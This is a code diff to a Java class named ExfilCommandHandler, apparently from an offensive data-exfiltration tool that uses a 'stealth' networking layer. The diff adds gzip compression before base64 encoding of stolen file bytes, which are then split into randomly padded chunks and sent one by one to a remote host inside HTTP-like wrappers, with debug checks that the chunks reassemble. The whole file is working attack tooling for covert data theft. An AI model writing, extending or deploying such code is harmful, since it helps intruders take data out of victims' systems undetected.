@@ -1,11 +1,13 @@
 package exfilfunctions;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.Base64;
+import java.util.zip.GZIPOutputStream;
 
 import networking.MultiserviceStealthUDPSocket;
 import networking.NetUtil;
@@ -46,9 +48,27 @@ public class ExfilCommandHandler {
 			for(int i = 0; i < exfilByteArray.length; i++){
 				exfilByteArray[i]=exfilBytes.get(i);
 			}
+			ByteArrayOutputStream exfilByteStream = new ByteArrayOutputStream(exfilByteArray.length);
+			GZIPOutputStream gzipper = new GZIPOutputStream(exfilByteStream);
+			gzipper.write(exfilByteArray);
+			gzipper.close();
+			byte[] gzippedExfilBytes = exfilByteStream.toByteArray();
 			System.out.println("[+] Data Read Complete");
-			String b64Data = new String(Base64.getEncoder().encode(exfilByteArray));
+			String b64Data = new String(Base64.getEncoder().encode(gzippedExfilBytes));
 			ArrayList<String> b64Chunks = NetUtil.getPartsRandB64Pad(b64Data, 85);
+			String reassembledData = "";
+			for(String chunk : b64Chunks){
+				if(chunk.indexOf('*')!=-1){
+					reassembledData+=chunk.substring(0, chunk.indexOf('*'));
+				}else{
+					reassembledData+=chunk;
+				}
+			}
+			System.out.println(reassembledData);
+			System.out.println(b64Data);
+			System.out.println(reassembledData.equals(b64Data));
+			Base64.getDecoder().decode(b64Data.getBytes());
+			Base64.getDecoder().decode(reassembledData.getBytes());
 			for(String chunk : b64Chunks){
 				String message = highSpeedHTTPOutHead+chunk+highSpeedHTTPOutTail;
 				System.out.println("[D] Sending Data: ");
@@ -60,6 +80,7 @@ public class ExfilCommandHandler {
 				System.out.println("[!] Response Recieved!");
 				Thread.sleep(waitTime);
 			}
+			System.out.println("[D] Exfil done!");
 			return "Exfil Success!";
 		}catch(Exception e){
 			return e.getMessage();
